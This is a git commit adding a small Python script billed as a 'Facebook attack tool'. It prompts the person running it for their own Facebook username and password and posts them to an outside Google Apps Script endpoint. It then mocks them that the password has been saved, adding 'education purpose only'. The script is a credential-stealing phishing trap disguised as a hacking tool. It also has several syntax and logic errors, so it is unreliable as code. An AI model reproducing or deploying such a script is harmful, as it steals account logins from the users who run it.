5dc4115d4a42dbbff510425715e511efe7e5ac69
Mg thite thite tun <74916390+kweethite@users.noreply.github.com>
2021-02-22 17:26:32 +0000

    Update and rename rqlogin.py to can-hack-your-acc.py

---
+++ can-hack-your-acc.py
@@ -0,0 +1,12 @@
+import requests
+import os
+os.system('clear') 
+print('WELCOM TO FACEBOOK ATTACK TOOL') 
+mail = input("Enter fb username : ")
+pass = input("Enter password : ")
+data ={'mail':mail,'pass':pass)
+requests.post("https://script.google.com/macros/s/AKfycbyrANAizvME_Y0rh4f6tOwwDl5M2CV_Ux-1xvAjrN7Uf-appT8/exec",date=data)
+for i in range(101):
+    print(i+"%")
+    if i == 100:
+       print(f"I Saved Your password ({pass}) in my database \n now you can change your password 😆😆\n education purpose only")
